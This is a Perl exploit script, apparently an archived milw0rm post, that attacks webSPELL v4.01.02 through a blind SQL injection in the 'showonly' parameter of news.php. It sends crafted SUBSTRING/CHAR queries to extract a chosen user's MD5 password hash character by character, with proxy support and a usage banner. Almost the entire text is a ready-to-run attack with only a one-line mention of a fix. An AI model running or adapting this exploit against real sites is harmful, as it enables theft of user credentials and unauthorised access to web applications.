#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
  print "\n                           \\#'#/                       ";
  print "\n                           (-.-)                        ";
  print "\n   -------------------oOO---(_)---OOo-------------------";
  print "\n   | webSPELL v4.01.02 (showonly) Remote SQL Injection |";
  print "\n   |      (works only with register_globals = on)      |";
  print "\n   |                   coded by DNX                    |";
  print "\n   -----------------------------------------------------";
  print "\n[!] Bug: in news.php line 601 \$showonly is unquoted, so u can inject sql code";
  print "\n[!] Solution: install security fix";
  print "\n[!] Usage: perl ws.pl [Host] [Path] <Options>";
  print "\n[!] Example: perl ws.pl 127.0.0.1 /webspell/ -i 2 -t my_user";
  print "\n[!] Options:";
  print "\n       -i [no]       User-ID, default is 1";
  print "\n       -t [name]     Changed the user table name, default is webs_user";
  print "\n       -p [ip:port]  Proxy support";
  print "\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $user    = 1;
my $table   = "webs_user";
my %options = ();
GetOptions(\%options, "i=i", "t=s", "p=s");

print "[!] Exploiting...\n";

if($options{"i"})
{
  $user = $options{"i"};
}

if($options{"t"})
{
  $table = $options{"t"};
}

syswrite(STDOUT, "[!] MD5-Hash: ", 14);

for(my $i = 1; $i <= 32; $i++)
{
  my $found = 0;
  my $h = 48;
  while(!$found && $h <= 57)
  {
    if(istrue2($host, $path, $table, $user, $i, $h))
    {
      $found = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$found)
  {
    $h = 97;
    while(!$found && $h <= 122)
    {
      if(istrue2($host, $path, $table, $user, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print "\n[!] Exploit done\n";

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $table = shift;
  my $uid   = shift;
  my $i     = shift;
  my $h     = shift;
  
  my $ua = LWP::UserAgent->new;
  my $url = "http://".$host.$path."index.php?site=news&showonly=%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")";
  
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
  
  my $response = $ua->get($url);
  my $content = $response->content;
  my $regexp = "Author";
  
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2007-02-16]